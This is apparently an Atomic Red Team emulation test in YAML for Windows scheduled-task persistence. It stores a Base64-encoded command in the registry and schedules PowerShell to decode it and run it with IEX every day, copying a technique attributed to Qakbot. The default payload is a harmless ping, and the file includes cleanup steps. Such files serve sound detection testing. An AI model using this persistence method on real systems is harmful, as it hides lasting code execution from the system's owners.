# Converted from Atomic Red Team - Scheduled Task/Job: Scheduled Task
# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1053.005
# Original auto_generated_guid: e895677d-4f06-49ab-91b6-ae3742d0a2ba

---
api_version: 2.0
uuid: 081e57b2-1bf3-4131-9365-a5d413d72bc4
name: Scheduled Task Executing Base64 Encoded Commands From Registry
authors:
  - isaac_fletcher
  - Atomic Red Team
description: |
  A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.
  The scheduled task will launch powershell to decode and run the command in the registry daily.
  This is a persistence mechanism recently seen in use by Qakbot.

  Additional Information: https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/

mitre:
  tactics:
    - "TA0003 Persistence"
    - "TA0004 Privilege Escalation"
  techniques:
    - "T1053 Scheduled Task/Job"
  subtechniques:
    - "T1053.005 Scheduled Task"

requirements:
  platforms:
    - os: windows
  superuser: false

args:
  - name: time
    description: Daily scheduled task execution time
    type: string
    default: "07:45"
  - name: task_name
    description: Name of scheduled task
    type: string
    default: "ATOMIC-T1053.005"
  - name: command_to_execute
    description: Command to execute
    type: string
    default: "ping 127.0.0.1"


steps:
  - name: create_registry_based_scheduled_task
    executor: powershell.exe
    inline: |
      $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("{{.Args.command_to_execute}}"))
      reg add "HKCU\SOFTWARE\{{.Args.task_name}}" /v test /t REG_SZ /d $encoded /f
      schtasks.exe /Create /F /TN "{{.Args.task_name}}" /TR "cmd /c start /min '' 'powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\{{.Args.task_name}}).test)))'" /sc daily /st {{.Args.time}}
    cleanup:
      executor: powershell.exe
      inline: |
        schtasks /delete /tn "{{.Args.task_name}}" /F
        reg delete "HKCU\SOFTWARE\{{.Args.task_name}}"" /F
